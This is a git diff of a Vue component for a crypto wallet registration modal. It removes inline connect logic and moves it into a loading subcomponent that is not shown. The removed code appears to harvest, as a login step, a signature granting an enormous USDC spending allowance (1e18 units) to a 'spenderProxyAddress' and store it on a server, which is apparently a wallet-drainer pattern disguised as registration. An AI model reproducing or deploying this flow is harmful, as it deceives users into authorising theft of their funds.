@@ -2,7 +2,7 @@
   <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
 
     <!-- Modal Container -->
-    <div class="bg-black border border-gray-800 w-full max-w-[480px] rounded-2xl p-8 relative shadow-2xl">
+    <div v-if="!showLoadingModal" class="bg-black border border-gray-800 w-full max-w-[480px] rounded-2xl p-8 relative shadow-2xl">
 
       <!-- Close Button -->
       <button @click="() => $emit('onClose')"
@@ -86,6 +86,22 @@
 
     </div>
 
+    <RegisterModalLoading :address-signature="auth.addressSignature"
+                      :wallet-address="auth.walletAddress"
+                      @close="() => {
+                        showLoginButton=false
+                        connectLoading=false
+                        showLoadingModal=false
+                        disconnectWallet()
+                        auth.walletAddress=''
+                        auth.isWalletConnected=false
+                      }"
+                      @onComplete="() => {
+                        showLoginButton=true
+                        connectLoading=false
+                        showLoadingModal=false
+                      }"
+                      v-else/>
   </div>
 </template>
 
@@ -110,6 +126,7 @@ const error = ref("")
 const loading = ref(false);
 const connectLoading = ref(false)
 const showLoginButton = ref(false)
+const showLoadingModal = ref(false)
 const auth = useAuth();
 
 
@@ -209,43 +226,7 @@ watch(() => auth.value.walletAddress, async() => {
         return;
     }
 
-        console.log('here', isMigrated.value, auth.value.addressSignature)
-    if (isMigrated.value) {
-        connectLoading.value = false;
-        showLoginButton.value = true;
-        return;
-    }
-
-    
-    try {
-        if (!auth.value.addressSignature) auth.value.addressSignature = await saveAddressSignature(getAddress());
-
-        const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10**18), 6);
-        console.log("signatureResult:    ", signatureResult);
-
-        await updateAddressSignature(getAddress(), signatureResult); 
-        auth.value.addressSignature = await getAddressSignature(getAddress());
-        showLoginButton.value = true;
-
-    } catch (err) {
-        if (err?.info?.error?.code == -32000) {
-            alert("Insufficient funds")
-        }
-        else if (err?.info?.error?.code == 4001) {
-            alert("Transaction rejected")
-        } else alert("An error occured")
-        console.log(err)
-        disconnectWallet()
-        auth.value.addressSignature = null
-        auth.value.walletAddress = ''
-        auth.value.isWalletConnected = false
-        showLoginButton.value = false;
-    }finally{
-        connectLoading.value=false;
-    }
-    
-
-
+    showLoadingModal.value = true;
 })
 
     // onMounted(() => {
@@ -256,14 +237,6 @@ watch(() => auth.value.walletAddress, async() => {
     //         auth.value.isWalletConnected = false
     //         showLoginButton.value = false;
     // })
-
-
-
-    const isMigrated = computed(() => {
-        return (auth.value.addressSignature?.signatures?.length && 
-            auth.value.addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) && 
-            auth.value.addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-    })
 
 </script>
 
